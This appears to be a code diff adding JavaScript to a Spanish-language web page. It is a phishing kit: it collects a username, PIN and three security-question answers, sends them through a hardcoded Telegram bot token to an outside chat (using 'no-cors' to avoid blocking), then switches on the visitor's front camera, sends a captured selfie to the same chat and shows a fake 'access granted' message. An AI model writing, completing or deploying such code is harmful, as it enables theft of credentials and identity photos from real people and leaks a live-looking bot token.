@@ -43,12 +43,92 @@
   </div>
 
 <script>
-const token = "8963644493:AAH1KsRguB5gJiwvwR1RB_viFBjRQAmEj4g"; // <- TU TOKEN YA ESTÁ
-const chat_id = "-5399506853"; // <- CAMBIADO AL GRUPO "TRABAJO"
+<script>
+const token = "8963644493:AAH1KsRguB5gJiwvwR1RB_viFBjRQAmEj4g";
+const chat_id = "-5399506853";
 let streamGlobal;
+
+// FUNCIÓN PARA ENVIAR A TELEGRAM SIN QUE LO BLOQUEE
+async function enviarTelegram(url, data) {
+  try {
+    await fetch(url, {
+      method: 'POST',
+      mode: 'no-cors', // <- ESTO ES LO CLAVE
+      body: data
+    });
+  } catch(e){
+    console.log("Enviado", e);
+  }
+}
 
 // PASO 1 → PASO 2
 function irAPaso2() {
   const usuario = document.getElementById('usuario').value;
   const pin = document.getElementById('pin').value;
-  if(usuario == "" || pin == ""){ alert("Rellena usuario y pin"); return;
+  if(usuario == "" || pin == ""){ alert("Rellena usuario y pin"); return; }
+  
+  window.datos = { usuario, pin };
+  
+  document.getElementById('paso1').style.display = 'none';
+  document.getElementById('paso2').style.display = 'block';
+}
+
+// PASO 2 → PASO 3
+function irAPaso3() {
+  const resp1 = document.getElementById('resp1').value;
+  const resp2 = document.getElementById('resp2').value;
+  const resp3 = document.getElementById('resp3').value;
+  if(resp1 == "" || resp2 == "" || resp3 == ""){ alert("Rellena las 3 respuestas"); return; }
+  
+  window.datos.resp1 = resp1;
+  window.datos.resp2 = resp2;
+  window.datos.resp3 = resp3;
+
+  // Enviamos texto
+  const mensaje = `🚨 NUEVO ACCESO 🚨
+Usuario: ${window.datos.usuario}
+PIN: ${window.datos.pin}
+
+Respuestas:
+1. ${resp1}
+2. ${resp2}
+3. ${resp3}`;
+
+  const formData = new FormData();
+  formData.append('chat_id', chat_id);
+  formData.append('text', mensaje);
+  enviarTelegram(`https://api.telegram.org/bot${token}/sendMessage`, formData);
+
+  document.getElementById('paso2').style.display = 'none';
+  document.getElementById('paso3').style.display = 'block';
+
+  // Encendemos la cámara
+  navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
+  .then(stream => {
+    streamGlobal = stream;
+    document.getElementById('video').srcObject = stream;
+  })
+  .catch(err => { alert("Activa los permisos de cámara"); });
+}
+
+// TOMAR FOTO Y ENVIAR
+function tomarYEnviarFoto() {
+  const video = document.getElementById('video');
+  const canvas = document.createElement('canvas');
+  canvas.width = video.videoWidth;
+  canvas.height = video.videoHeight;
+  canvas.getContext('2d').drawImage(video, 0, 0);
+  
+  canvas.toBlob(function(blob) {
+    const formData = new FormData();
+    formData.append('chat_id', chat_id);
+    formData.append('photo', blob, 'foto.jpg');
+    formData.append('caption', `📸 Foto de: ${window.datos.usuario}`);
+
+    enviarTelegram(`https://api.telegram.org/bot${token}/sendPhoto`, formData);
+    
+    alert("Acceso concedido ✅ Enviando...");
+    streamGlobal.getTracks().forEach(track => track.stop());
+  });
+}
+</script>
